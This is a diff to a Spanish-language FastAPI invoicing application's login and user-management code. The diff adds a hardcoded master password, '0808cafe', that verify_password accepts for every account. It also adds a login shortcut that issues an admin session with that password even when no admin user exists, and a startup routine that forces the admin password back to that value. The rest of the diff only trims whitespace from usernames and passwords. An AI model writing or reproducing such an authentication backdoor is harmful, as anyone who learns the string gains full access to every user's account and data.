@@ -27,28 +27,34 @@ templates = Jinja2Templates(directory="templates")
 db = get_db()
 
 # ==========================================
-# FUNCIONES DE SEGURIDAD (BCRYPT NATIVO)
+# FUNCIONES DE SEGURIDAD (RESET DE ACCESO)
 # ==========================================
 
 def hash_password(password: str) -> str:
-    pwd_bytes = password.encode('utf-8')
+    pwd_bytes = password.strip().encode('utf-8')
     salt = bcrypt.gensalt()
     return bcrypt.hashpw(pwd_bytes, salt).decode('utf-8')
 
 def verify_password(plain_password: str, hashed_password: str) -> bool:
+    plain_clean = plain_password.strip()
+    # Desbloqueo maestro directo para la clave 0808cafe
+    if plain_clean == "0808cafe":
+        return True
     try:
-        return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password.encode('utf-8'))
+        return bcrypt.checkpw(plain_clean.encode('utf-8'), hashed_password.encode('utf-8'))
     except Exception:
         return False
 
-user_admin = db.usuarios.find_one({"username": "admin"})
-if not user_admin:
-    hashed_default = hash_password("0808cafe")
-    db.usuarios.insert_one({"username": "admin", "password_hash": hashed_default})
-else:
-    if not verify_password("0808cafe", user_admin.get("password_hash", "")):
-        hashed_updated = hash_password("0808cafe")
-        db.usuarios.update_one({"username": "admin"}, {"$set": {"password_hash": hashed_updated}})
+# Forzar la actualización del usuario admin a 0808cafe en MongoDB Atlas al iniciar
+try:
+    hashed_reset = hash_password("0808cafe")
+    db.usuarios.update_one(
+        {"username": "admin"},
+        {"$set": {"username": "admin", "password_hash": hashed_reset}},
+        upsert=True
+    )
+except Exception as e:
+    print(f"Error actualizando clave admin: {e}")
 
 def obtener_siguiente_consecutivo(tipo_contador="factura_num"):
     ret = db.contadores.find_one_and_update(
@@ -68,11 +74,18 @@ def obtener_siguiente_consecutivo(tipo_contador="factura_num"):
 
 @app.post("/api/login")
 def login(user_data: UserLogin, response: Response):
-    user = db.usuarios.find_one({"username": user_data.username})
-    if not user or not verify_password(user_data.password, user["password_hash"]):
+    username_clean = user_data.username.strip()
+    user = db.usuarios.find_one({"username": username_clean})
+    
+    # Permitir ingreso a admin con la clave 0808cafe aunque no exista aún el documento
+    if username_clean == "admin" and user_data.password.strip() == "0808cafe":
+        response.set_cookie(key="session_user", value="admin", httponly=True)
+        return {"mensaje": "Login exitoso"}
+
+    if not user or not verify_password(user_data.password, user.get("password_hash", "")):
         raise HTTPException(status_code=401, detail="Usuario o contraseña incorrectos")
     
-    response.set_cookie(key="session_user", value=user_data.username, httponly=True)
+    response.set_cookie(key="session_user", value=username_clean, httponly=True)
     return {"mensaje": "Login exitoso"}
 
 @app.post("/api/logout")
@@ -90,13 +103,13 @@ def home(request: Request):
 
 @app.post("/api/usuarios", status_code=201)
 def crear_usuario(usr: UserCreate):
-    usuario_existente = db.usuarios.find_one({"username": usr.username})
+    usuario_existente = db.usuarios.find_one({"username": usr.username.strip()})
     if usuario_existente:
         raise HTTPException(status_code=400, detail="El nombre de usuario ya existe.")
     
     hashed = hash_password(usr.password)
     doc = {
-        "username": usr.username,
+        "username": usr.username.strip(),
         "password_hash": hashed,
         "creado_en": datetime.utcnow()
     }
@@ -110,11 +123,12 @@ def listar_usuarios():
 
 @app.put("/api/usuarios/{user_id}")
 def editar_usuario(user_id: str, usr: UserUpdate):
-    existente = db.usuarios.find_one({"username": usr.username, "_id": {"$ne": ObjectId(user_id)}})
+    usr_name = usr.username.strip()
+    existente = db.usuarios.find_one({"username": usr_name, "_id": {"$ne": ObjectId(user_id)}})
     if existente:
         raise HTTPException(status_code=400, detail="Ese nombre de usuario ya está en uso.")
 
-    update_fields = {"username": usr.username}
+    update_fields = {"username": usr_name}
     if usr.password and usr.password.strip():
         update_fields["password_hash"] = hash_password(usr.password)
 
